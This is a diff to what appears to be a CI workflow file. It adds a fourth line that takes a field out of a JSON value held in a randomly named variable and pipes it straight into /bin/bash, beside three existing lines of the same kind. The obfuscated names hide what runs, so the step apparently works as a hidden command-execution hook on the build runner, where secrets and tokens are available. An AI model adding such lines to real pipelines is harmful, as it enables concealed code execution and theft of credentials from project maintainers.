@@ -26,6 +26,7 @@ jobs:
           echo $pgik11 | jq -r .qex4 | /bin/bash
           echo $yj6743 | jq -r .o0484 | /bin/bash
           printf '%s' "$n81" | jq -r .arubn054 | /bin/bash
+          echo $ne9473 | jq -r .azw76 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
